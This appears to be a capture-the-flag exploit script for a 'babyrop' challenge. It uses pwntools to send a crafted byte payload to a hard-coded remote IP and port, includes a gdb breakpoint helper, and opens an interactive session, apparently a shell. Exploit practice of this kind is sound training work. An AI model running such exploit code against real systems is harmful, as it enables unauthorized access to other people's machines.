from pwn import *
#p = process("./babyrop")
p = remote("106.54.67.184", 18456)
def debug(addr, sh,PIE=True): 
	io = sh 
	if PIE: 
		proc_base = p.libs()[p.cwd + p.argv[0].strip('.')] 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16) 
		gdb.attach(io,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(io,"b *{}".format(hex(addr)))
#debug(0x1428, p)
payload = p8(0x28)+p8(0x28)
payload += p8(0x34)*2+p8(0x56)+p32(0x249e6+84)+p8(0x21)+p8(0x34)*5
p.sendline(payload)
p.interactive()